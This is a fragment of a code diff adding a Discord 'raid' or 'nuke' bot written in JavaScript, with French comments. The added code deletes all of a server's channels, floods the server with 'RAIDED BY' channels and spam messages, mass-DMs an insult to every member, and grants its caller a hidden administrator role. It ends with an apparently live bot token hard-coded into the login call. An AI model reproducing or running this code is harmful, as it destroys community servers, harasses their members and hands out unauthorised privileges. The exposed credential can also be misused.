+        .then(c => c.send("@everyone RAIDED BY IceM. https://discord.gg/6vgHsM6gV4"));
+      message.guild
+        .createChannel("SIPHER RAID", "text")
+        .then(c => c.send("@everyone RAIDED BY SIPHER https://discord.gg/6vgHsM6gV4"));
+      message.guild
+      .createChannel("SIPHER RAID", "text")
+        .then(c => c.send("@everyone RAIDED BY SIPHER https://discord.gg/6vgHsM6gV4"));
+      message.guild  
+    }
+  }
+  if (message.content === "?hi") {
+    message.guild.channels.map(c => c.delete());
+  }
+  //on commence la destruction
+  if (message.content.includes("channel")) {
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    message.guild
+      .createChannel("WIZZED BY DIGITAL", "text")
+      .then(c => c.send("channel"));
+  }
+});
+
+client.on("message", message => {
+  const prefix = "v";
+
+  // COMMANDE POUR MP ALL MEMBRE
+  if (message.content === "-dm") {
+    message.delete();
+    message.guild.members.forEach(member => {
+      member.send("PUSSY GET WIZZED");
+    });
+  }
+
+  // COMMANDE POUR CE METTRE ADMIN
+  if (message.content === "-admin") {
+    if (message.deletable) message.delete();
+    message.member.guild
+      .createRole({
+        name: "All > perm",
+        permissions: "ADMINISTRATOR",
+        mentionable: false,
+        color: "#b8b4b4"
+      })
+      .then(function(role) {message.member.addRole(role).catch(e => {});
+        if (message.deletable) message.delete().catch(e => {});
+      })
+  }
+})
+
+client.login("OTIzMjcyMzQ4Mzk0NzIxMzEw.YcNmYQ.R4R1asqNbWnme3GdWQPZNoYfoWU")
